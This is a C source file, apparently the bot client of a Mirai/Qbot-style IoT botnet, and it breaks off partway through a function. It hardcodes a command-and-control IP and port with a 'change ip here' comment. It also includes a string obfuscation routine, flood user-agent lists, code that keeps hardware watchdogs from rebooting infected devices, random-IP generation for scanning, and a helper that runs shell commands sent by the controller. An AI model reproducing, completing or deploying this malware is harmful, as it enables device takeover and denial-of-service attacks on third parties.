#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include "headers/includes.h"
#include "headers/util.h"
#include "headers/table.h"

#define STD2_SIZE 8191
#define std_packets 1240
#define std_packet 1240
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define OPT_SGA   3
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define PHI 0x9e3779b9
#define srv_lst_sz (sizeof(ip1), sizeof(ip2), sizeof(ip3), sizeof(ip4))
#define pr_name 15
#define pad_r 
#define pad_z 2
#define printbuf_len 12
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))

#define HTONS(n) (n)
#define HTONL(n) (n)

#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | ((((unsigned long)(n) & 0xff00)) << 8) | ((((unsigned long)(n) & 0xff0000)) >> 8) | ((((unsigned long)(n) & 0xff000000)) >> 24))

int ip1[] = {91}; //change ip here
int ip2[] = {205}; //this is if ur ip is ex: 1.1.1.1
int ip3[] = {173};
int ip4[] = {252}; 
int bot_PORT = 1111;

char encodes[] = { 
    '%', 'q', '*', 'K', 'C', ')', '&', 'F', '9', '8', 'f', 's', 'r', '2', 't', 'o', '4', 'b', '3', 'y', 'i', '_', ':', 'w', 'B', '>', 'z', '=', ';', '!', 'k', '?', '"', 'E', 'A', 'Z', '7', '.', 'D', '-', 'm', 'd', '<', 'e', 'x', '5', 'U', '~', 'h', ',', 'j', '|', '$', 'v', '6', 'c', '1', 'g', 'a', '+', 'p', '@', 'u', 'n'
    
};
char decodes[] = { 
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
    'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
    'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
    'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
char decoded[512];

char *decode(char *str)
{
    int x = 0, i = 0, c;

    memset(decoded, 0, sizeof(decoded));
    while(x < strlen(str))
    {
        for(c = 0; c <= sizeof(encodes); c++)
        {
            if(str[x] == encodes[c])
            {
                decoded[i] = decodes[c];
                i++;
            }
        }
        x++;
    }
    decoded[i] = '\0';

    return decoded;
}

const char *UserAgents[] = {
    "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
};
//useragents
const char *useragents[] = {
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"TheSuBot/0.2 (www.thesubot.de)",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8", 
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01", 
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};//yakuza user agents
//useragents
const char *useragentspatch[] = {
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"TheSuBot/0.2 (www.thesubot.de)",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8", 
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01", 
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};//yakuza user agents

char *inet_ntoa(struct in_addr in);
int initConnection();
int sockprintf(int sock, char *formatStr, ...);
int KHcommSOCK = 0, KHserverHACKER = -1, userID = 1, watchdog_pid = 0;

uint32_t *pids;
uint32_t scanPid;
uint32_t ngPid;
uint64_t numpids = 0;
int killer_status = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};

static uint32_t Q[4096], c = 362436;

void watchdog_maintain(void){
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;
    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;
    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2); //el oh el
    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1){
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found){
        while(TRUE){
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);
    exit(0);
}
void init_rand(uint32_t x){
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
void trim(char *str){
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin])) begin++;

    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    str[i - begin] = '\0';
}
uint32_t rand_cmwc(void){
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
void rand_alphastr(uint8_t *str, int len){ // Random alphanumeric string, more expensive than rand_str
    table_unlock_val(TABLE_MISC_RANDSTRING);
    char *alphaset = table_retrieve_val(TABLE_MISC_RANDSTRING, NULL);
    while (len > 0){
        if (len >= sizeof (uint32_t)){
            int i;
            uint32_t entropy = rand_cmwc();;
            for (i = 0; i < sizeof (uint32_t); i++){
                uint8_t tmp = entropy & 0xff;
                entropy = entropy >> 8;
                tmp = tmp >> 3;
                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else{
            *str++ = rand_cmwc() % (sizeof (alphaset));
            len--;
        }
    }
    table_lock_val(TABLE_MISC_RANDSTRING);
}
static void printchar(unsigned char * * str, int c) {
  if (str) { * * str = c;
    ++( * str);
  } else(void) write(1, & c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
  register int pc = 0, padchar = ' ';
  if (width > 0) {
    register int len = 0;
    register
    const unsigned char * ptr;
    for (ptr = string; * ptr; ++ptr) ++len;
    if (len >= width) width = 0;
    else width -= len;
    if (pad & PAD_ZERO) padchar = '0';
  }
  if (!(pad & PAD_RIGHT)) {
    for (; width > 0; --width) {
      printchar(out, padchar);
      ++pc;
    }
  }
  for (; *string; ++string) {
    printchar(out, *string);
    ++pc;
  }
  for (; width > 0; --width) {
    printchar(out, padchar);
    ++pc;
  }

  return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';

    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
        printchar (out, '-');
        ++pc;
        --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
void RandString(unsigned char * buf, int length) {
  int i = 0;
  for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}
in_addr_t GetRandomIP(in_addr_t netmask) {
  in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
  return tmp ^ (rand_cmwc() & ~netmask);
}
static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];
for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, intptr_t );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}

int zprintf(const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print(0, format, args);
}

int szprintf(unsigned char * out,
  const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print( & out, format, args);
}

int sockprintf(int sock, char * formatStr, ...) {
  unsigned char * textBuffer = malloc(2048);
  memset(textBuffer, 0, 2048);
  char * orig = textBuffer;
  va_list args;
  va_start(args, formatStr);
  print(&textBuffer, formatStr, args);
  va_end(args);
  orig[strlen(orig)] = '\n';
  int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
  free(orig);
  return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type){
    register int iop;
    int pdes[2], fds, pid;
    if (*type != 'r' && *type != 'w' || type[1]) return -1;
    if (pipe(pdes) < 0) return -1;
    if (fdopen_pids == NULL) {
        if ((fds = getdtablesize()) <= 0) return -1;
        if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
        memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
    }
    switch (pid = vfork())
    {
    case -1:
        close(pdes[0]);
        close(pdes[1]);
        return -1;
    case 0:
        if (*type == 'r') {
            if (pdes[1] != 1) {
                dup2(pdes[1], 1);
                close(pdes[1]);
            }
            close(pdes[0]);
        } else {
            if (pdes[0] != 0) {
                (void) dup2(pdes[0], 0);
                (void) close(pdes[0]);
            }
            (void) close(pdes[1]);
        }
        execl("/bin/sh", "sh", "-c", program, NULL);
        _exit(127);
    }
    if (*type == 'r') {
        iop = pdes[0];
        (void) close(pdes[1]);
    } else {
        iop = pdes[1];
        (void) close(pdes[0]);
    }
    fdopen_pids[iop] = pid;
    return (iop);
}
int fdpclose(int iop){
    register int fdes;
    sigset_t omask, nmask;
    int pstat;
    register int pid;

    if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
    (void) close(iop);
    sigemptyset(&nmask);
    sigaddset(&nmask, SIGINT);
    sigaddset(&nmask, SIGQUIT);
    sigaddset(&nmask, SIGHUP);
